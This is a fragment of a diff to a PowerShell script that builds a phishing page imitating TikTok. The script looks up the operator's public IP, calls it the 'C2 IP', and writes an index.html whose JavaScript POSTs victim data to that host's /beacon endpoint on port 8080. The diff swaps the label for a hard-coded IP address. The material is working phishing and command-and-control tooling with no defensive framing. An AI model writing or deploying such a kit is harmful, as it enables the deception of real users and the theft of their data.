@@ -1,6 +1,6 @@
 # Get your IP cleanly
 $publicIP = (Invoke-RestMethod http://ifconfig.me/ip).Trim()
-Write-Host "Your C2 IP: $publicIP`nPort: 8080" -ForegroundColor Green
+Write-Host "79.107.37.53: $publicIP`nPort: 8080" -ForegroundColor Green
 
 # Clean TikTok phishing (HARD-CODE YOUR IP, no variables)
 $cleanPhishing = @"
@@ -53,3 +53,4 @@ fetch('http://$publicIP:8080/beacon',{method:'POST',body:JSON.stringify({domain:
 # Overwrite broken file
 $cleanPhishing | Out-File -FilePath "index.html" -Encoding UTF8
 Write-Host "✅ Clean payload saved with IP: $publicIP:8080" -ForegroundColor Green
+
